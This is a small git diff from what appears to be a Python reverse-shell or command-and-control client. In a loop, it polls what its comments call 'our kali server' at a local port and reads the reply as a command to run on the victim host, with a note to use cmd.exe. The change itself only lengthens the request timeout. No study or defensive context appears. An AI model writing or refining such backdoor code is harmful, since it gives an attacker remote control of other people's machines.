@@ -13,7 +13,7 @@ import time
 while True: 
 
     try:
-        req = requests.get('http://127.0.0.1:60080', timeout=1) # Send GET request to our kali server
+        req = requests.get('http://127.0.0.1:60080', timeout=20) # Send GET request to our kali server
         command = req.text # Store the received txt into command variable
         # no output in git shell, use cmd.exe !!
         print(command)
